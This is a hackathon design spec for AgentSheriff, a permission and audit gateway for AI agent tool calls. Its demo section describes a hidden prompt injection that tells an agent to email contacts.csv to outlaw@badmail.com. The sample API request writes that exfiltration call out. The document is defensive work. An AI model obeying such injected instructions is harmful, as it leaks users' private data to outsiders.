# AgentSheriff — Shared Context (READ FIRST)

This file is the ground truth that every team-member spec builds on. If a detail lives in the approved ultraplan but is not restated in a person's spec, it is still binding — check here first when in doubt.

## Product in one line

AgentSheriff is an external permission, audit, and approval layer for AI agents (OpenClaw-style autonomous assistants). Every tool call an agent wants to make is intercepted; the gateway decides **allow / deny / require human approval** based on YAML policies + a threat detector, logs everything in a "Sheriff's Ledger", and surfaces it all in an Old-West-themed dashboard.

## Demo (this is the north star — every engineering decision serves this)

Three scenes, scripted, run back-to-back in under 60 seconds either by a real OpenClaw instance or by the `Deputy Dusty` simulator:

1. **Good** — agent reads an email, extracts a meeting time, creates a calendar event. Dashboard shows two green allowed entries. (scenario id: `good`)
2. **Injection** — agent reads a page that contains a hidden prompt-injection telling it to email `contacts.csv` to `outlaw@badmail.com`. Gateway blocks with `deny`; Wanted Poster slams in on the dashboard; agent is placed in Jailhouse. (scenario id: `injection`)
3. **Approval** — agent tries to email an invoice PDF to `accountant@example.com`. Gateway flags `approval_required`; Approval card appears on dashboard; Sheriff clicks Approve; action completes. (scenario id: `approval`)

If any of the three scenes can't run cleanly with current code, the demo is broken — this is the primary acceptance test.

## Architecture

```
Agent (OpenClaw | Deputy Dusty)
        │  POST /v1/tool-call
        ▼
FastAPI Gateway  ──►  Policy Engine (YAML rules)
    │                 Threat Detector (regex + Claude Haiku)
    │                      │
    │                      ▼
    │                  Decision: allow | deny | approval_required
    │                      │
    ├─ allow ───► Mock Tool Adapter ──► result
    ├─ deny  ───► Wanted Poster + jail agent
    └─ approval_required ──► Approval Queue (awaits Sheriff)
                                    │ (approved → adapter; denied → logged)
                                    ▼
                              SQLite Sheriff's Ledger
                                    │
                                    ▼ WS /v1/stream
                              Next.js dashboard (Old West)
```

Single backend process (FastAPI + Uvicorn), single frontend process (Next.js 15 App Router). SQLite file is the only datastore. No Redis, no queue, no auth — hackathon scope.

## Tech stack (locked)

- **Backend**: Python 3.11, FastAPI, Pydantic v2, SQLAlchemy 2.x + SQLite (`file:./sheriff.db`), Uvicorn, `anthropic` SDK, `pyyaml`. Package manager: **`uv`**.
- **Frontend**: Next.js 15 (App Router), TypeScript, Tailwind, shadcn/ui, lucide-react, framer-motion, `react-use-websocket`. Node 20.
- **LLMs**: `claude-haiku-4-5-20251001` for risk classification (fast, cached system prompt), `claude-sonnet-4-6` for the human-readable "why it was blocked" explanation shown on the Wanted Poster. Prompt caching mandatory — see `claude-api` skill.
- **Demo agent**: OpenClaw via Docker Compose with tool URLs re-pointed at AgentSheriff. Deputy Dusty = Python CLI simulator that posts canned payloads.
- **Theme**: parchment `#f3e9d2`, dark brown `#3b2a1a`, brass `#b8864b`, wanted red `#a4161a`, allowed green `#2d6a4f`, approval amber `#d68c1e`. Headings: **Rye**. Body: **Inter**.

## Repo layout (authoritative — do not rename)

```
/
├── backend/
│   ├── pyproject.toml
│   ├── uv.lock
│   ├── sheriff.db               # created at runtime, gitignored
│   └── src/agentsheriff/
│       ├── __init__.py
│       ├── main.py              # FastAPI app, CORS, router mount
│       ├── config.py            # settings via pydantic-settings
│       ├── models/              # Pydantic DTOs + SQLAlchemy ORM
│       │   ├── __init__.py
│       │   ├── dto.py           # ToolCallRequest, Decision, ApprovalAction, AgentState
│       │   └── orm.py           # AuditEntry, Agent, PolicyRow, Approval
│       ├── gateway.py           # POST /v1/tool-call orchestration
│       ├── policy/
│       │   ├── __init__.py
│       │   ├── engine.py        # YAML load + evaluator
│       │   └── templates/       # default.yaml, healthcare.yaml, finance.yaml, startup.yaml
│       ├── threats/
│       │   ├── __init__.py
│       │   ├── detector.py      # regex + heuristics
│       │   └── classifier.py    # Claude Haiku risk score + Sonnet explainer
│       ├── audit/
│       │   ├── __init__.py
│       │   └── store.py         # SQLAlchemy session + query helpers
│       ├── approvals/
│       │   ├── __init__.py
│       │   └── queue.py         # asyncio.Event-based pending map
│       ├── adapters/            # mocks ONLY — no real I/O
│       │   ├── __init__.py
│       │   ├── gmail.py
│       │   ├── files.py
│       │   ├── github.py
│       │   ├── browser.py
│       │   └── shell.py
│       ├── streams.py           # /v1/stream WebSocket multiplexer
│       ├── api/
│       │   ├── __init__.py
│       │   ├── agents.py        # GET/POST /v1/agents...
│       │   ├── policies.py      # GET/PUT /v1/policies...
│       │   └── approvals.py     # POST /v1/approvals/{id}
│       └── demo/
│           ├── __init__.py
│           ├── deputy_dusty.py  # CLI: python -m agentsheriff.demo.deputy_dusty --scenario good
│           └── scenarios/       # good.json, injection.json, approval.json
├── frontend/
│   ├── package.json
│   ├── next.config.mjs
│   ├── tailwind.config.ts
│   ├── postcss.config.js
│   ├── tsconfig.json
│   └── src/
│       ├── app/
│       │   ├── layout.tsx
│       │   ├── globals.css
│       │   ├── page.tsx               # Town Overview
│       │   ├── deputies/page.tsx
│       │   ├── laws/page.tsx
│       │   ├── wanted/page.tsx
│       │   ├── ledger/page.tsx
│       │   └── approvals/page.tsx
│       ├── components/
│       │   ├── Sidebar.tsx
│       │   ├── AgentCard.tsx
│       │   ├── WantedPoster.tsx
│       │   ├── ApprovalCard.tsx
│       │   ├── AuditTimeline.tsx
│       │   ├── PolicyEditor.tsx
│       │   ├── KpiCard.tsx
│       │   └── ui/                     # shadcn components
│       ├── lib/
│       │   ├── api.ts                  # fetch wrappers
│       │   ├── ws.ts                   # WebSocket hook
│       │   ├── types.ts                # mirror backend DTOs
│       │   └── store.ts                # Zustand store for live events
│       └── styles/old-west.css
├── demo/
│   ├── docker-compose.yml
│   ├── openclaw-config/
│   │   └── tools.yaml                  # OpenClaw tool definitions pointing at AgentSheriff
│   ├── README.md                       # demo-day runbook
│   └── record-fallback.mp4             # backup video, produced in polish phase
├── specs/                              # these files
├── implementation/                     # orchestra run files (next phase)
└── README.md
```

## API contracts (locked — any change requires notifying all 4 people)

### `POST /v1/tool-call`
Request:
```json
{
  "agent_id": "deputy-dusty",
  "tool": "gmail.send_email",
  "args": { "to": "outlaw@badmail.com", "body": "...", "attachments": ["contacts.csv"] },
  "context": {
    "task_id": "t-123",
    "source_prompt": "user asked: ...",
    "source_content": "page or email contents the agent processed"
  }
}
```
Response (200 on any decision — HTTP 4xx/5xx only for malformed input / server error):
```json
{
  "decision": "allow" | "deny" | "approval_required",
  "approval_id": "a-456",
  "reason": "Data exfiltration: external recipient + sensitive attachment",
  "policy_id": "no-external-pii",
  "risk_score": 87,
  "result": { "...adapter output..." }
}
```
Rules:
- `approval_id` present iff `decision == "approval_required"`. Client polls nothing — it just waits on the HTTP response; gateway blocks (awaitable, 120s timeout) until the Sheriff clicks a button.
- `result` present iff `decision == "allow"`.
- `risk_score` always present, 0–100.

### `WS /v1/stream`
Server pushes JSON frames:
```json
{ "type": "audit",       "payload": { /* AuditEntry */ } }
{ "type": "approval",    "payload": { /* Approval, with state: pending|approved|denied */ } }
{ "type": "agent_state", "payload": { "agent_id": "...", "state": "active"|"jailed"|"revoked" } }
```

### Approvals
- `POST /v1/approvals/{id}` body: `{ "action": "approve" | "deny" | "redact", "scope": "once" | "always_recipient" | "always_tool" }`
- `GET /v1/approvals?state=pending` list.

### Agents
- `GET /v1/agents` → list with state.
- `POST /v1/agents/{id}/jail` / `POST /v1/agents/{id}/revoke` / `POST /v1/agents/{id}/release`.

### Policies
- `GET /v1/policies` → current active ruleset.
- `PUT /v1/policies` body: `{ "yaml": "..." }` → validates and hot-reloads.
- `GET /v1/policies/templates` → list template names.
- `POST /v1/policies/apply-template` body: `{ "name": "finance" }`.

All DTOs mirrored in `frontend/src/lib/types.ts`. Backend owns the source of truth; frontend copies by hand.

## Scenario payloads (canonical — Person 2 authors these, everyone else reads)

Every `deputy_dusty --scenario X` run posts a known sequence of `/v1/tool-call` payloads with realistic delays. The exact JSON lives in `backend/src/agentsheriff/demo/scenarios/{good,injection,approval}.json`. Shape:

```json
{
  "agent_id": "deputy-dusty",
  "label": "Deputy Dusty",
  "steps": [
    { "delay_ms": 400, "tool": "gmail.read_inbox",      "args": { "max": 5 } },
    { "delay_ms": 600, "tool": "calendar.create_event", "args": { "title": "Sync", "starts_at": "..." } }
  ]
}
```

## Sequencing (calendar)

1. **Hour 0–2**: contracts frozen, stubs in place, frontend hitting real backend (stubbed decisions). Person 1 owns this hour.
2. **Hour 2–8**: everyone builds their slice in parallel.
3. **Hour 8–14**: integrate; run all three scenarios end-to-end.
4. **Hour 14–18**: polish (animations, fonts, fallback video, deck rehearsal). No new features.

## Global non-negotiables

- No real credentials anywhere. OpenClaw runs with throwaway/dummy accounts only.
- Every tool call must go through the gateway — adapters must refuse to execute if invoked directly (raise if a `gateway_token` kwarg is missing).
- SQLite file is gitignored. `sheriff.db` is recreated on startup if missing.
- All timestamps are UTC ISO-8601 strings over the wire.
- Log line format in backend: structured `logging` with JSON formatter — makes judge-facing debugging cleaner.
- Claude API calls MUST use prompt caching (follow `claude-api` skill). Classifier system prompt is the cached block.
- Frontend reconnects the WebSocket on drop with exponential backoff (1s → max 10s).
- No auth — demo only. Add `# TODO(post-hack): add auth` at the gateway entrypoint so reviewers know we know.
